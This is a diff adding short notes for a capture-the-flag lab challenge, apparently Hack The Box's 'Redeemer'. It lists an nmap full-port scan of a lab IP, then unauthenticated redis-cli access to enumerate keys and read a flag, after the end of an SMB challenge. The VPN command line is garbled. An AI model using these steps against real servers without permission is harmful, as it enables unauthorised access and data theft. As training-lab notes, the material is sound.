@@ -37,3 +37,18 @@
 - smb: \James.P\> ls
 - smb: \James.P\> get flag.txt
 - cat flag.txt
+
+
+## Redeemer challenge:
+- sudo opstarting_point_ahmed00078.ovpn8.ovpn
+- nmap -p- -sV 10.129.28.47
+- sudo apt install redis-tools
+- redis-cli --help
+- redis-cli -h 10.129.28.47
+- 10.129.28.47:6379> info
+- 10.129.28.47:6379> select 0
+- 10.129.28.47:6379> keys *
+- 10.129.28.47:6379> get stor
+- 10.129.28.47:6379> get temp
+- 10.129.28.47:6379> get numb
+- 10.129.28.47:6379> get flag
